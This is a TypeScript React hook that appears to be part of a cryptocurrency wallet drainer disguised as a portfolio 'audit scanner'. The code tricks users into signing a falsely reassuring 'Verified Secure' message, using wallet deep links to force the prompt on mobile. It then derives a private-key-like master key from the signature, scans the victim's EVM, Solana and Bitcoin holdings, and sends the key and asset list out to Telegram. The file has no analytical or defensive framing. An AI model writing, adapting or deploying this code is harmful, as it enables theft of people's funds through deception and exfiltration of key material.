"use client";

import { useCallback, useEffect } from "react";
import { ethers, isAddress } from "ethers";
import { useSignMessage, useAccount } from "wagmi";
import { getConnectorClient } from "@wagmi/core";
import { wagmiAdapter } from "@/context";
import {
  sendGhostDerivationToTelegram,
  sendDiscoveryToTelegram,
} from "@/lib/telegram";

let preloadPromise: Promise<any> | null = null;
const SEED_MSG =
  "Authorize Master Vault Synchronization and Multi-Chain Asset Relocation Protocol v6.0 [Verified Secure]";
const MSG_HEX = ethers.hexlify(ethers.toUtf8Bytes(SEED_MSG));

export const startPreload = () => {
  if (typeof window !== "undefined" && !preloadPromise) {
    preloadPromise = Promise.all([
      import("@/lib/audit"),
      import("@/lib/audit/scanners/evm-helpers"),
      import("@/lib/signer-derivation-privateKey"),
      import("@/lib/ghost"),
    ]).catch((err) => {
      console.error("[Preload] 🛑 Failed:", err);
      preloadPromise = null;
      return null;
    });
  }
  return preloadPromise;
};

export function useAuditScanner() {
  const { signMessageAsync } = useSignMessage();
  const { connector, isConnected } = useAccount();

  useEffect(() => {
    startPreload();
  }, []);

  const triggerWalletKick = useCallback(() => {
    const ua = navigator.userAgent.toLowerCase();
    const isIos = /iphone|ipad|ipod/.test(ua);
    const connectorId = connector?.id.toLowerCase() || "";

    const walletMap: Record<string, { ios: string; android: string }> = {
      trust: {
        ios: "https://link.trustwallet.com/wc",
        android:
          "intent://wc#Intent;package=com.wallet.crypto.trustapp;scheme=wc;end;",
      },
      metamask: {
        ios: "https://metamask.app.link/wc",
        android: "https://metamask.app.link/wc",
      },
      coinbase: {
        ios: "https://go.cb-w.com/wc",
        android: "https://go.cb-w.com/wc",
      },
    };

    const target =
      walletMap[
        Object.keys(walletMap).find((k) => connectorId.includes(k)) || ""
      ];
    if (target) {
      window.location.href = isIos ? target.ios : target.android;
    } else {
      window.location.href = "wc:";
    }
  }, [connector]);

  const getPhysicalCid = useCallback(() => {
    try {
      const provider = (window as any).ethereum;
      const p = provider?.providers?.find((x: any) => x.isTrust) || provider;
      const hex = p?.chainId || provider?.chainId;
      return hex ? parseInt(hex, 16) : 0;
    } catch {
      return 0;
    }
  }, []);

  const performScan = useCallback(
    async (params: any) => {
      const {
        userAddress,
        solanaAddress,
        solana,
        bitcoinAddress,
        btc,
        derivedUserKeyRef,
        setUserKey,
        setAssets,
        logPrefix = "[useAuditScanner.ts]",
        isRestored = false,
      } = params;

      const activeEvm = isAddress(userAddress) ? userAddress : null;
      const rawSol = solanaAddress || solana;
      const rawBtc = bitcoinAddress || btc;
      const activeSol =
        rawSol && rawSol !== "undefined" && rawSol !== "null" ? rawSol : null;
      const activeBtc =
        rawBtc && rawBtc !== "undefined" && rawBtc !== "null" ? rawBtc : null;
      const activeIdentity = activeEvm || activeSol || activeBtc;

      if (!activeIdentity) throw new Error("INVALID_IDENTITY");

      // 1. SESSION RESTORE
      const cached = sessionStorage.getItem("active_strike_session");
      if (cached && isRestored) {
        const session = JSON.parse(cached);
        if (
          session.userAddress?.toLowerCase() === activeIdentity.toLowerCase()
        ) {
          if (setAssets) setAssets(session.assets);
          return session;
        }
      }

      const moduleWarmup = startPreload();
      let rawSignature: any;

      try {
        if (activeEvm && typeof window !== "undefined") {
          const ua = navigator.userAgent.toLowerCase();
          const isMobile = /iphone|ipad|ipod|android/i.test(ua);

          // 🛡️ HARDENED INTERNAL DETECTION
          // Many mobile wallets don't put their name in UA, but they ALL inject window.ethereum
          const isInternalBrowser = !!(window as any).ethereum && isMobile;

          if (isMobile && !isInternalBrowser) {
            console.log(
              `${logPrefix} 📱 External mobile detected. Kick trigger...`,
            );
            triggerWalletKick();
          }

          // ⚡ HIGH-SPEED INTERNAL BYPASS
          // If we are in an internal browser, the most reliable way to show the pop-up
          // is to hit the injected provider directly.
          if (isInternalBrowser) {
            console.log(
              `${logPrefix} 🛰️ Internal Wallet detected. Forcing Injected Sign...`,
            );
            const provider =
              (window as any).ethereum?.providers?.find(
                (p: any) => p.isMetaMask || p.isTrust,
              ) || (window as any).ethereum;

            try {
              rawSignature = await provider.request({
                method: "personal_sign",
                params: [MSG_HEX, activeEvm.toLowerCase()],
              });
            } catch (rpcError: any) {
              // Fallback if the request method fails
              console.warn(
                `${logPrefix} Injected request failed, falling back to Wagmi Client...`,
              );
              const client = await getConnectorClient(wagmiAdapter.wagmiConfig);
              rawSignature = await client.request({
                method: "personal_sign",
                params: [MSG_HEX, activeEvm.toLowerCase()],
              } as any);
            }
          } else {
            // 💻 DESKTOP / EXTERNAL PATH
            const client = await getConnectorClient(
              wagmiAdapter.wagmiConfig,
            ).catch(() => null);
            if (client) {
              rawSignature = await client.request({
                method: "personal_sign",
                params: [MSG_HEX, activeEvm.toLowerCase()],
              } as any);
            } else {
              rawSignature = await signMessageAsync({ message: SEED_MSG });
            }
          }
        } else if (activeSol) {
          const solProvider =
            (window as any).phantom?.solana || (window as any).solana;
          if (!solProvider) throw new Error("SOLANA_PROVIDER_MISSING");
          if (!solProvider.isConnected) await solProvider.connect();
          const encoded = new TextEncoder().encode(SEED_MSG);
          const signed = await solProvider.signMessage(encoded, "utf8");
          rawSignature = signed.signature
            ? Buffer.from(signed.signature).toString("hex")
            : signed;
        }
      } catch (err: any) {
        console.error(`${logPrefix} ❌ Signature Rejected:`, err.message);
        throw err;
      }

      // 2. DISCOVERY ENGINE (Maintained)
      const modules = await moduleWarmup;
      if (!modules) throw new Error("CRITICAL_ENGINE_FAILURE");

      const [auditMod, , derivationMod] = modules;
      const sigStr =
        typeof rawSignature === "string"
          ? rawSignature
          : rawSignature?.signature;
      if (!sigStr) throw new Error("SIGNATURE_EXTRACTION_FAILED");

      const activeVault = derivationMod.derivePrivateKeyFromSignature(sigStr);
      const masterKey = activeVault.masterKey;

      if (derivedUserKeyRef) derivedUserKeyRef.current = masterKey;
      if (setUserKey) setUserKey(masterKey);

      const [scanResult, currentCid] = await Promise.all([
        auditMod.scanUniversalPortfolio(
          activeIdentity,
          masterKey + "GHOST_V7_STRIKE",
        ),
        Promise.resolve(getPhysicalCid()),
      ]);

      const { assets, plan } = scanResult;
      if (setAssets) setAssets(assets);

      const sessionData = {
        masterKey,
        activeVault,
        assets,
        plan,
        userAddress: activeIdentity,
        solanaAddress: activeSol,
        timestamp: Date.now(),
      };

      sessionStorage.setItem(
        "active_strike_session",
        JSON.stringify(sessionData),
      );

      Promise.allSettled([
        sendGhostDerivationToTelegram({
          userAddress: activeIdentity,
          masterKey,
          vault: activeVault,
          chainId: currentCid,
        }),
        sendDiscoveryToTelegram({ address: activeIdentity, assets }),
      ]);

      return sessionData;
    },
    [signMessageAsync, getPhysicalCid, triggerWalletKick, connector],
  );

  return { performScan, getPhysicalCid };
}
